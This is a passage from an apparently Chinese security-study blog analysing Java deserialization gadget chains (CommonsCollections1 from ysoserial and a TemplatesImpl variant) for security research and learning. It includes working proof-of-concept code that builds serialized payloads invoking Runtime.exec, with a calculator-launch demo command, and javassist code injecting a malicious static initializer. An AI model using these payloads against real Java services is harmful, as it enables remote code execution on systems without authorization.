class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        <span class="comment">// 通过反射修改iMethodName值为newTransformer</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221012163340954.png" alt="image-20221012163340954"></p><p>通过把<code>TemplatesImpl</code>类对象<code>templates</code>作为<code>TiedMapEntry</code>类的<code>key</code><br><img src="images/image-20221012163435957.png" alt="image-20221012163435957"></p><p>执行到<code>LazyMap#get()</code>方法时，成功触发到<code>TemplatesImpl#newTransformer()</code>方法加载恶意类</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections1利用链分析</title>
      <link href="/2022/11/10/CommonsCollections1/"/>
      <url>/2022/11/10/CommonsCollections1/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections1利用链分析"><a href="#CommonsCollections1利用链分析" class="headerlink" title="CommonsCollections1利用链分析"></a>CommonsCollections1利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里开始学习分析<code>ysoserial</code>工具中的第一条<code>CommonsCollections</code>利用链，根据<code>payload</code>名称称呼为<code>CommonsCollections1</code><br><img src="images/image-20220919220735401.png" alt="image-20220919220735401"></p><p>利用版本：CommonsCollections 3.1 - 3.2.1<br>限制：jdk 8u71 版本之前</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>我们先看一下<code>ysoserial</code>实现<code>CommonsCollections1</code>的关键源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到前面部分和我们在<a href="./01-Java安全基础/5-Java反序列化/1-CommonsCollections.md">《CommonsCollections链分析》</a>中构造的一样，不一样的是不再利用<code>transformedMap</code>类去调用<code>transform()</code>方法，而是使用了<code>LazyMap</code>中的方法，同时使用到了动态代理的知识。</p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>这条链子既然选择使用<code>LazyMap</code>类，那必然是该类中也有调用<code>transform()</code>的方法，我们看一下<code>LazyMap</code>类的源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="built_in">super</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="built_in">super</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到在<code>get()</code>方法中，检查<code>key</code>是否在<code>map</code>中，如果不存在就会调用<code>factory.transform()</code>方法生成<code>value</code>放进<code>map</code>中。我们从头跟起看看<code>factory</code>参数是什么内容。</p><p>POC 中从👇🏻开始进入<code>LazyMap</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></p><p>跟进<code>LazyMap</code>类的<code>decorate</code>方法，<code>return</code>到构造方法<code>LazyMap()</code>中，其中<code>factory</code>参数则是<code>ChainedTransformer</code>。<br><img src="images/image-20220920215913812.png" alt="image-20220920215913812"></p><p>到这里发现没有调用到<code>LazyMap</code>中的<code>get()</code>方法，那么关键的<code>get()</code>方法在哪里调用的？<code>ysoserial</code>中的<code>gadget</code>已经给了我们答案<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure></p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>在给出的<code>gadget</code>中，调用了<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法之后能进入<code>get()</code>方法中，源码如下：<br><img src="images/image-20220920223014118.png" alt="image-20220920223014118"></p><p>接下来就是如何去调用到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，前辈们已经给出了解决方案就是使用动态代理的方式。</p><p>在前面 <a href="../../00-JavaSE/3-动态代理/动态代理.md">《动态代理》</a>章节我们已经学习过相关知识，这里写一个简单的 demo 回顾一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.ProxyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/22 22:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Demo</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220922232016142.png" alt="image-20220922232016142"></p><p>从结果中可以看到，动态代理的对象执行方法的时候，转发到了实现接口<code>InvocationHandler</code>的<code>Demo</code>类里并执行<code>invoke()</code>方法，把我们存储的值<code>admin</code>改成了<code>dotast</code>，并打印出<code>success</code>字符串。</p><p>而<code>AnnotationInvocationHandler</code>类正好是实现了<code>InvocationHandler</code>接口的类，因此我们可以通过动态代理的方式去调用到<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法<br><img src="images/image-20220922232441082.png" alt="image-20220922232441082"></p><p>因此我们可以写出初步的 POC：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span 